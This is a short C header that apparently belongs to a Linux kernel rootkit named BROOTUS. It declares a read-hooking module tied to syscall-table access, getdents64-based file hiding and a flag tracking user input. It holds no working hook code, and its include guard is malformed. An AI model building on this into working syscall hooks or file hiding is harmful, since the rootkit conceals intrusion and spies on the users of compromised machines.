#ifndef WRITE_HOOKING_H
#define WRITE_HOOKING_H
#endif

#include <linux/dirent.h>	// For getdents64

#include "hack_pi.h"
#include "syscall_table.h"

BROOTUS_MODULE(read_hooking);    // Macros for init_file_hiding
extern bool IS_COMMAND;			// if user pressed enter
